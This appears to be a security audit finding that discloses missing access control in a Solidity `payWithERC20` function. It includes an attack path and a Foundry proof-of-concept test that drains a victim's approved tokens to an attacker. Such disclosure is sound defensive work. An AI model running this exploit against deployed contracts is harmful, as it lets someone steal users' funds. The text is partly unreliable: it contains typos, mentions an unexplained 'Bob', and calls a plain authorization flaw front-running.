# Front-Running Vulnerability in `payWithERC20`

### Summary

The `[payWithERC20](https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/Payment.sol#L25)` function allows transferring ERC20 tokens from one address (`fromAddress`) to another (`toAddress`). However, **it lacks proper access control**, meaning **anyone can call this function** as long as `fromAddress` has previously approved the contract to spend their tokens.  

This creates a **front-running vulnerability**, where an attacker can **monitor pending transactions**, modify the recipient address, and execute a malicious transaction first, **stealing funds from the original sender**.

### Root Cause

1. **No `msg.sender` Authorization Check**  
   - The function **does not verify** that `msg.sender` is actually `fromAddress`, meaning **anyone can trigger a transfer from another user** if they have approved the contract.
   
2. **Front-Running Risk**  
   - Since blockchain transactions are **publicly visible before execution**, an attacker can **monitor an intended transfer**, craft a malicious transaction with a higher gas fee, and have it executed first.
   - This allows the attacker to **redirect the funds to their own address** before the legitimate transaction executes.


### Internal Pre-conditions

1. Users has approved token allowance
2. Font-Running

### External Pre-conditions

1. Users has approved token allowance
2. Font-Running

### Attack Path

#### **Step 1: Victim Initiates a Transaction**
- Alice calls:
  ```solidity
  userTopUp(tokenAddress, 1000);
  ```
- This transaction is **broadcasted to the mempool**.

#### **Step 2: Attacker Observes the Transaction**
- An attacker (Eve) **monitors** pending transactions in the mempool.
- Eve sees Alice is about to pre fund in `BlueprintCore` contract.

#### **Step 3: Attacker Creates a Malicious Transaction**
- Before Alice’s transaction is confirmed, Eve submits:
  ```solidity
  payWithERC20(tokenAddress, 1000, Alice, Eve);
  ```
- Eve **increases the gas fee** to ensure miners prioritize this transaction.

#### **Step 4: Attacker's Transaction Executes First**
- Because Eve's transaction has a **higher gas fee**, it gets executed before Alice’s.
- **1000 tokens are transferred to Eve instead of Bob**.
- When Alice's original transaction is executed, it **fails due to insufficient balance**, or it executes but the funds are already stolen.


### Impact

- **Users can have their funds stolen if they approve the contract but do not immediately use it.**
- **Attackers can exploit this issue to steal tokens before legitimate transactions are executed.**


### PoC

```solidity
    function test_FrontRun_payWithERC20_userTopUp() public {
        uint256 topUpAmount = 100 * 10 ** 18;

        // Add the payment address
        blueprint.addPaymentAddress(address(mockToken));

        address Alice = makeAddr("Alice");
        vm.startPrank(Alice);
        mockToken.mint(Alice, topUpAmount);

        // Approve the blueprint contract to spend tokens
        mockToken.approve(address(blueprint), topUpAmount);
        vm.stopPrank();

        address attacker = makeAddr("Attacker");
        vm.prank(attacker);
        blueprint.payWithERC20(address(mockToken), topUpAmount, Alice, attacker);

        // Call the userTopUp function but failed
        vm.startPrank(Alice);
        vm.expectRevert();
        blueprint.userTopUp(address(mockToken), topUpAmount);
        vm.stopPrank();
    }
```

### Mitigation

Modify the function so that **only `fromAddress` can initiate the transfer** or make the `payWithERC20` internal.
